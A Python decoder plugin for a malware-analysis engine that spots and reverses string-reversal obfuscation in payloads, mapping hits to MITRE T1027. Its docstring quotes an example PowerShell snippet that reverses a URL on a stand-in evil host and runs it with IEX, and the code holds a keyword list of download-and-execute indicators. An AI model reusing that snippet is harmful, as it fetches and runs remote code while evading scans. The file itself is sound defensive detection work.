"""String-reverse decoder plugin.

Attackers frequently store the true command in reverse to defeat static
keyword scans and then reconstruct at runtime:

    $c = "1sp.a/moc.live//:ptth"
    [Array]::Reverse($c)
    IEX $c

Detection heuristic
-------------------
Reverse the payload; if the reversed form is *dramatically* more English-like
than the original (higher printable + more common trigrams like 'the', 'ing',
'com', 'http'), we treat that as a reverse-obfuscated blob and emit the
reversed text.
"""
from __future__ import annotations

import re
from typing import Any, Dict

from engine.decoder_base import BaseDecoder
from engine.models import (
    AnalysisContext,
    DetectResult,
    Fingerprint,
    MitreHint,
    PluginResult,
)
from engine.registry import DecoderRegistry


_HINT_KEYWORDS = (
    "http", "https", "https:", "http:", "://", "powershell", "cmd", "iex",
    "invoke", ".exe", ".ps1", ".com", ".net", ".org", "downloadstring",
)
# The reverse of those tokens — if any of these show up in the ORIGINAL
# payload, reversing is very likely the right move.
_REVERSED_HINTS = tuple(k[::-1] for k in _HINT_KEYWORDS)


def _hint_score(text: str) -> int:
    lower = text.lower()
    return sum(1 for kw in _HINT_KEYWORDS if kw in lower)


class ReverseStringDecoder(BaseDecoder):
    id = "reverse-string"
    name = "Reverse String"
    category = "reconstruct"
    cost = 1
    tags = ("reverse", "reconstruct", "deobfuscate")
    schema_version = "1.0"

    def detect(self, payload: str, fp: Fingerprint, ctx: AnalysisContext) -> DetectResult:
        if not payload or len(payload) < 8:
            return DetectResult(confidence=0.0, why="Too short")
        lower = payload.lower()
        rev_hits = sum(1 for kw in _REVERSED_HINTS if kw in lower)
        fwd_hits = _hint_score(payload)
        # Require the reversed form to show at least 2 new hits and beat the
        # forward form; otherwise this is a pure guess.
        if rev_hits >= 2 and rev_hits > fwd_hits:
            return DetectResult(
                confidence=0.75,
                why=f"Reversed-token hits={rev_hits} exceed forward hits={fwd_hits}",
                args={"rev_hits": rev_hits, "fwd_hits": fwd_hits},
            )
        return DetectResult(confidence=0.0, why="No reverse-obfuscation signal")

    def decode(self, payload: str, args: Dict[str, Any], ctx: AnalysisContext) -> PluginResult:
        reversed_text = payload[::-1]
        return PluginResult(
            output=reversed_text,
            notes=[
                "Reversed input — recovered "
                f"{args.get('rev_hits', '?')} hint token(s).",
            ],
            mitre_hints=[
                MitreHint(
                    id="T1027", technique="Obfuscated Files or Information",
                    tactic="Defense Evasion",
                    evidence="String-reverse obfuscation",
                    source="heuristic",
                ),
            ],
            explanation=(
                "Payload contained hallmark tokens in reversed form (e.g. `:sptth`, "
                "`llehsrewop`); reversing produced the true text."
            ),
        )


DecoderRegistry.register(ReverseStringDecoder())
